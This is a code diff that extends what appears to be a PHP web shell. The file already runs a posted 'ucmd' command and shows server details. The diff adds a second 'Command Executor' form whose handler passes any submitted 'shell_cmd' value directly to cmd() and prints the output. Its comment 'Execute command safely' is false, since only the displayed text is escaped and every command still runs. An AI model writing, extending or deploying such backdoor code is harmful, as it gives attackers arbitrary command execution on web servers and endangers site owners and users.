@@ -574,6 +574,17 @@ $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($
                                                         </div>
                                                     </div>
                                                 </form>
+                                                
+                                                <!-- Command Executor -->
+                                                <form action="" method="post">
+                                                    <div class="mb-3">
+                                                        <label class="form-label">Command Executor</label>
+                                                        <div class="input-group">
+                                                            <input type="text" class="form-control" name="shell_cmd" placeholder="Enter command..." aria-describedby="shellCmdBtn">
+                                                            <button class="btn btn-outline-light" type="submit" id="shellCmdBtn">Execute</button>
+                                                        </div>
+                                                    </div>
+                                                </form>
                                             <?php elseif ($action == 'command') : ?>
                                                 <form action="" method="post">
                                                     <div class="mb-3">
@@ -598,6 +609,35 @@ $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($
                                 <div class="row justify-content-center">
                                     <div class="card text-dark col-md-7 mb-3">
                                         <pre><?php echo $ip."@".$serv.":&nbsp;~$&nbsp;"; echo $cmd = $_POST['ucmd']; $cmd."<br>"; ?><br><code><?php echo cmd($cmd); ?></code></pre>
+                                    </div>
+                                </div>
+                            </div>
+                            <?php endif; ?>
+
+                            <!-- shell command executor output -->
+                            <?php if (isset($_POST['shell_cmd'])) : ?>
+                            <div class="p-2">
+                                <div class="row justify-content-center">
+                                    <div class="card text-dark col-md-7 mb-3">
+                                        <div class="card-header">
+                                            <strong>Command Output</strong>
+                                        </div>
+                                        <div class="card-body">
+                                            <pre class="mb-0"><?php 
+                                                echo $ip."@".$serv.":~$ "; 
+                                                echo htmlspecialchars($_POST['shell_cmd']); 
+                                                echo "<br><br>"; 
+                                                
+                                                // Execute command safely
+                                                $shell_command = $_POST['shell_cmd'];
+                                                if (!empty($shell_command)) {
+                                                    $output = cmd($shell_command);
+                                                    echo "<code>" . htmlspecialchars($output) . "</code>";
+                                                } else {
+                                                    echo "<span class='text-muted'>No command provided</span>";
+                                                }
+                                            ?></pre>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
